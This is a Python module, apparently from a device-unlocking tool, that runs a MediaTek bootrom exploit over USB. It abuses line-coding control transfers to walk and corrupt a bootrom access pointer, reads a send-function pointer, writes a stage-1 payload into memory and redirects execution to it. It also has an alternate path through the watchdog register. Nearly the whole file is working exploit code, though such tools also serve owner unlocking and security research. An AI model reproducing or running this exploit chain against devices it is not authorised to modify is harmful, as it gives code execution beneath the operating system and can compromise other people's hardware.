from __future__ import annotations

import contextlib
import struct
from typing import TYPE_CHECKING, cast

from firebreak.amonet.payload import NotReadyError
from firebreak.mediatek.libusb import (
    CONTROL_INTERFACE,
    ELEVATES,
    FROM_DEVICE,
    TO_INTERFACE,
    trigger,
)
from firebreak.mediatek.usbdl import (
    BAUD_RATE,
    WORD_SIZE,
    ProtocolMismatchError,
    UsbdlError,
)

if TYPE_CHECKING:
    from firebreak.mediatek.libusb import Usb
    from firebreak.mediatek.usbdl import Bootrom

ACCESS_OFFSET = 0x40
ACCESS_REGISTER = 0xD7AC
CONFIGURATION_DESCRIPTOR = 0x0200
DESCRIPTOR_LENGTH = 9
GET_DESCRIPTOR = 0x06
GET_LINE_CODING = 0x21
LADDER = range(0xF, 0, -1)
LINE_CODING = struct.pack("<IBBB", BAUD_RATE, 0, 0, 8)
LINE_CODING_SIZE = 7
PAYLOAD_ADDRESS = 0x100A00
POINTER_STEPS = 3
SEND_POINTER = 0xD2E4
SEND_POINTER_OFFSET = 8
SET_LINE_CODING = 0x20
STAGE1_READY = b"\xa1\xa2\xa3\xa4"
TRIGGER_INDEX = 0xCC
WATCHDOG_RESTART = 0x10007050


def await_ready(*, bootrom: Bootrom, note: str) -> None:
    try:
        ready = bootrom.read_exactly(
            label="stage 1 ready pattern", length=len(STAGE1_READY)
        )
    except ProtocolMismatchError as error:
        message = f"{error}.{note}"
        raise NotReadyError(message) from error
    if ready != STAGE1_READY:
        message = (
            f"stage 1's ready pattern: expected {STAGE1_READY!r}, got {ready!r}.{note}"
        )
        raise NotReadyError(message)


def linecoded(*, port: Usb) -> bytes:
    linecode = port.control_in(
        index=CONTROL_INTERFACE,
        length=LINE_CODING_SIZE,
        request=GET_LINE_CODING,
        request_type=TO_INTERFACE | FROM_DEVICE,
        value=0,
    )
    if len(linecode) != LINE_CODING_SIZE:
        message = (
            f"GET_LINE_CODING answered {len(linecode)} of {LINE_CODING_SIZE} bytes"
        )
        raise OSError(message)
    return linecode + b"\0"


def loaded(*, bootrom: Bootrom, linecode: bytes, stage1: bytes) -> None:
    walked(bootrom=bootrom, linecode=linecode)
    (send,) = struct.unpack(
        "<I",
        bootrom.access(address=SEND_POINTER - ACCESS_OFFSET, length=WORD_SIZE),
    )
    walked(bootrom=bootrom, linecode=linecode)
    bootrom.access(address=PAYLOAD_ADDRESS - ACCESS_OFFSET, data=stage1)
    walked(bootrom=bootrom, linecode=linecode)
    bootrom.access(
        address=send + SEND_POINTER_OFFSET - ACCESS_OFFSET,
        data=struct.pack("<I", PAYLOAD_ADDRESS),
        end_status=False,
    )


def overflowed(*, bootrom: Bootrom, stage1: bytes) -> None:
    port = usb(bootrom=bootrom)
    with contextlib.suppress(OSError):
        port.control_out(
            data=LINE_CODING,
            index=CONTROL_INTERFACE,
            request=SET_LINE_CODING,
            value=0,
        )
    note = ""
    try:
        loaded(bootrom=bootrom, linecode=linecoded(port=port), stage1=stage1)
    except OSError as error:
        note = f" The line-coding transfers answered: {error}."
    await_ready(bootrom=bootrom, note=note)


def pointed(*, bootrom: Bootrom, linecode: bytes, pointer: int) -> None:
    port = usb(bootrom=bootrom)
    port.control_out(
        data=linecode + struct.pack("<I", pointer),
        index=CONTROL_INTERFACE,
        request=SET_LINE_CODING,
        value=0,
    )
    port.control_in(
        index=0,
        length=DESCRIPTOR_LENGTH,
        request=GET_DESCRIPTOR,
        request_type=FROM_DEVICE,
        value=CONFIGURATION_DESCRIPTOR,
    )


def refused(*, said: str) -> str:
    return f" The trigger itself answered: {said}." if said else ""


def reversed_word(*, value: int) -> int:
    return struct.unpack("<I", struct.pack(">I", value))[0]


def start_stage1(*, bootrom: Bootrom, stage1: bytes) -> None:
    if ELEVATES:
        triggered(bootrom=bootrom, stage1=stage1)
    else:
        overflowed(bootrom=bootrom, stage1=stage1)


def triggered(*, bootrom: Bootrom, stage1: bytes) -> None:
    bootrom.write_words(
        address=WATCHDOG_RESTART, words=(reversed_word(value=PAYLOAD_ADDRESS),)
    )
    for step in LADDER:
        bootrom.read_words(
            address=WATCHDOG_RESTART - step * WORD_SIZE, count=step + 1, strict=False
        )
    bootrom.send_payload(payload=stage1)
    await_ready(bootrom=bootrom, note=refused(said=trigger(index=TRIGGER_INDEX)))


def usb(*, bootrom: Bootrom) -> Usb:
    return cast("Usb", bootrom.port)


def walked(*, bootrom: Bootrom, linecode: bytes) -> None:
    with contextlib.suppress(OSError, UsbdlError):
        bootrom.access(address=0, length=1)
        bootrom.read_words(address=WATCHDOG_RESTART, count=1, strict=False)
    for step in range(POINTER_STEPS):
        pointed(bootrom=bootrom, linecode=linecode, pointer=ACCESS_REGISTER + 5 + step)
    for step in range(POINTER_STEPS):
        pointed(bootrom=bootrom, linecode=linecode, pointer=ACCESS_REGISTER - 2 - step)
